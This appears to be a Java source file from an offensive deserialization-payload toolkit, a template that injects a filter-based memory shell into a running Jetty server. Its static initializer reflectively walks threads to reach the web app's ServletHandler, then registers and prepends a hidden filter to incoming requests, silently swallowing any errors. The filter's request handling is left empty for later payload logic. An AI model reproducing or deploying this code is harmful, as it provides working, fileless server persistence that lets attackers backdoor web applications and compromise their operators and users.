package org.su18.ysuserial.payloads.templates.memshell.jetty;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;

/**
 * @author su18
 */
public class JFMSFromThread implements Filter {

	public static String pattern;

	public static String NAME;


	static {
		try {
			Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
			threadMethod.setAccessible(true);
			Thread[]    threads           = (Thread[]) threadMethod.invoke(null);
			ClassLoader threadClassLoader = null;

			for (Thread thread : threads) {
				threadClassLoader = thread.getContextClassLoader();
				if (threadClassLoader != null) {
					if (threadClassLoader.toString().contains("WebAppClassLoader")) {
						Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
						fieldContext.setAccessible(true);

						Object webAppContext = fieldContext.get(threadClassLoader);

						Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
						fieldServletHandler.setAccessible(true);
						Object servletHandler = fieldServletHandler.get(webAppContext);

						Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
						fieldFilters.setAccessible(true);
						Object[] filters = (Object[]) fieldFilters.get(servletHandler);
						boolean  flag    = false;
						for (Object filter : filters) {
							Field fieldName = filter.getClass().getSuperclass().getDeclaredField("_name");
							fieldName.setAccessible(true);
							String name = (String) fieldName.get(filter);
							if (name.equals(NAME)) {
								flag = true;
								break;
							}
						}

						// 如果没有同名的内存马
						if (!flag) {
							ClassLoader classLoader = servletHandler.getClass().getClassLoader();
							Class       sourceClazz = null;
							Object      holder      = null;
							Field       field       = null;
							try {
								sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
								field = sourceClazz.getDeclaredField("JAVAX_API");
								Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
								holder = method.invoke(servletHandler, field.get(null));
							} catch (ClassNotFoundException e) {
								try {
									sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
								} catch (ClassNotFoundException ignored) {
									sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Holder$Source");
								}
								Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
								holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
							}

							holder.getClass().getMethod("setName", String.class).invoke(holder, NAME);
							holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, new JFMSFromThread());
							servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);
							Class  clazz         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
							Object filterMapping = clazz.newInstance();

							Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
							method.setAccessible(true);
							method.invoke(filterMapping, holder);

							filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
							filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{pattern}});
							servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandler, filterMapping);
						}
					}
				}
			}
		} catch (Exception ignored) {
		}
	}

	@Override
	public void init(FilterConfig filterConfig) throws ServletException {
	}

	@Override
	public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
	}

	@Override
	public void destroy() {
	}

}
